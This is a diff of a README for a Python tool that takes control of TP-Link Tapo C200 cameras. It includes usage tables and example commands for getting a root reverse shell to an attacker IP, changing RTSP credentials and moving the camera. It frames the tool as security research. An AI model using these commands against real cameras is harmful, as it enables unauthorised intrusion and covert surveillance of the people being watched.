@@ -1,74 +1,117 @@
 # Tapo C200 Control Script
 
-### Educational Purposes Only
+![Tapo C200 Banner](images/control.png)
 
-Python script to pwn the TL-Link Tapo c200 camera and get full access.
+A powerful Python script to gain full control over TP-Link Tapo C200 IP cameras. This tool provides root access, RTSP credential modification, and complete camera control capabilities.
 
-## Features
+**⚠️ Disclaimer**: This project is for educational and security research purposes only. Use only on devices you own or have permission to test.
 
-* Root shell access
-* Changing RTSP video stream credentials
-* Controlling the movement
-* Enabling/Disabling privacy mode
-* Saving and restoring presets
-* Resetting position
-* Rebooting 
+## Key Features
+
+- 🛠️ **Full Root Access**: Obtain a reverse shell with root privileges
+- 🔑 **RTSP Control**: Modify video stream credentials
+- 🎥 **Camera Control**:
+  - Pan/tilt movement control
+  - Privacy mode toggle (lens cover)
+  - Preset position management (save/recall up to 8 positions)
+  - Camera reboot and reset functions
+- 📡 **Network Integration**: Easy setup for remote access
+
+## Installation
+
+1. Clone the repository:
+
+  ```bash
+  git clone https://github.com/yourusername/tapo-c200-control.git
+  cd tapo-c200-control
+  ```
+2. Install required dependencies:
+
+  ```bash
+  pip install requests urllib3
+  ```
 
 ## Usage
-
+### Basic Command Structure
+```bash
+python3 tapocontrol.py -t <TARGET_IP> -a <ATTACKER_IP> -m <MODE> [OPTIONS]
 ```
-Tp-Link Tapo C200 Universal Control Script
 
-options:
-  -h, --help            show help message
+### Modes of Operation
+| Mode    | Description                        | Required Options     |
+|---------|------------------------------------|----------------------|
+| shell   | Get a reverse shell on the camera  | -p  (listening port) |
+| rtsp    | Change RTSP stream credentials     | None                 |
+| control | Interactive camera control console | None                 |
 
+### Full Options
+```text
 Required Arguments:
-  -t, --target
-        Tapo C200 IP address
-  -a, --attacker
-        Your IP address
-  -m, --mode {shell,rtsp,control}
-        Operation mode:
-            - shell    Get a reverse shell
-            - rtsp     Change RTSP credentials
-            - control  Control camera
+  -t, --target         Tapo C200 IP address
+  -a, --attacker       Your IP address for reverse shell callback
+  -m, --mode           Operation mode (shell|rtsp|control)
 
 Optional Arguments:
-  -p, --revshell-port
-        Port to listen for reverse shell on
-  -v, --verbose         Enable debugging
+  -p, --revshell-port  Port for reverse shell (default: 1337)
+  -v, --verbose        Enable verbose debugging output
 ```
-
-## Screenshots
-
-### Usage
-
-![Usage](./images/usage.png)
-
-### Shell
-
-![Shell](./images/shell.png)
-
-### Rtsp
-
-![Rtsp](./images/rtsp.png)
-
-### Control
-
-![Control](./images/control.png)
 
 ## Examples
+### Get a reverse shell:
 
 ```bash
-python3 tapocontrol.py -t 192.168.191.1 \
-                       -a 192.168.191.101 \
-                       -m shell \
-                       -p 12345
+python3 tapocontrol.py -t 192.168.1.100 -a 192.168.1.50 -m shell -p 4444
 ```
 
+### Change RTSP credentials:
+
 ```bash
-python3 tapocontrol.py -t 192.168.191.1 \
-                       -a 192.168.191.101 \
-                       -m control \
-                       -v
+python3 tapocontrol.py -t 192.168.1.100 -a 192.168.1.50 -m rtsp
 ```
+
+### Control camera movements:
+
+```bash
+python3 tapocontrol.py -t 192.168.1.100 -a 192.168.1.50 -m control
+```
+
+### Control Console Commands
+
+Once in control mode, use these commands:
+
+| Command           | Description                      |
+|-------------------|----------------------------------|
+| up [steps]        | Move camera up                   |
+| down [steps]      | Move camera down                 |
+| left [steps]      | Move camera left                 |
+| right [steps]     | Move camera right                |
+| stop              | Stop all movement                |
+| preset_goto <1-8> | Recall saved preset position     |
+| preset_set <1-8>  | Save current position as preset  |
+| privacy_on        | Enable privacy mode (close lens) |
+| privacy_off       | Disable privacy mode             |
+| reboot            | Reboot the camera                |
+| reset             | Reset camera to default position |
+| exit              | Quit the control console         |
+
+### Screenshots
+#### Root shell access via reverse TCP connection
+![Shell demo](images/shell.png)
+
+#### Modifying RTSP stream credentials
+![RTSP demo](images/rtsp.png)
+
+#### Interactive camera control console
+![Control mode demo](images/control.png)
+
+## Security Notice
+This script demonstrates security vulnerabilities in the Tapo C200 camera system. TP-Link has been notified about these issues.
+
+### Important:
+
+* Use only on devices you own
+* Never deploy on networks without permission
+* Understand that this may violate terms of service
+
+### Author
+[@TryH4ckM3](https://t.me/TryH4ckM3) - Security Researcher
